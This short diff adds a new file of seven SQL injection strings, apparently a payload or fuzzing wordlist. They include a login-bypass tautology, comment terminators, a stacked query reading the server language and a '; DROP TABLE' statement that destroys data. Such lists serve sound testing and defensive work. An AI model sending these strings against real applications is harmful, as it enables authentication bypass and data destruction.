@@ -1,0 +1,7 @@
+' OR '1'='1
+' AND '1'='0
+' --
+--
+;SELECT @@language --
+SELECT *",             
+; DROP TABLE myTable --
